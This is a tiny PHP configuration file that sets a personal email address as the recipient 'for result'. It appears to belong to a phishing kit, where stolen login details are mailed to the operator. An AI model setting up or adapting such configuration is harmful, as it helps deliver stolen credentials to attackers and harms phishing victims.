<?php
$send="ranjke250@gmail.com"// your email address for result
?>